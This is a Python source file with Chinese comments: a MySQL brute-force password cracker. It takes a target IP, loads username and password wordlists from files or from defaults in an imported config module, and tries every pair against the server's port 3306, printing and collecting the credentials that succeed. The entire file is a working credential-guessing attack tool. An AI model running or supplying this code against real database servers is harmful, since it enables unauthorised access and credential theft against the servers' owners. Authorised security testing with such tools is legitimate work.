import pymysql
from config import *
 
def mysql_brute_force(hostname, username, password):
    userdict = dict()
    try:
        conn = pymysql.connect(host=hostname, user=username, password=password)
        conn.close()
        print(f"[+] 登录成功：{username}@{hostname}:3306，密码：{password}")
        userdict[username] = password
    except pymysql.err.OperationalError as e:
        print(f"[-] 登录失败：{username}@{hostname}:3306，密码：{password}")
    except pymysql.err.InternalError as e:
        print(f"[!] MySQL错误：{str(e)}")
    return userdict

def mysqlCrack(ip:str, userfile:str, passwdfile:str):
    userdict = dict()
    userlist = []
    passwdlist = []
    if not ip:
        return dict()
    if userfile:    # 是否采用指定字典文件
        with open(userfile, "r") as f1:
            userlist = f1.readlines()
            for i in range(len(userlist)):
                userlist[i] = userlist[i].strip()
    if passwdfile:
        with open(passwdfile, "r") as f2:
            passwdlist = f2.readlines()
            for i in range(len(passwdlist)):
                passwdlist[i] = passwdlist[i].strip()
    if not userlist:
        for user in Userdict['mysql']:
            userlist.append(user)
    if not passwdlist:
        passwdlist = Passwords
    #print(userlist, passwdlist)
    for username in userlist:
        for password in passwdlist:
            userdict.update(mysql_brute_force(ip, username, password))
    return userdict
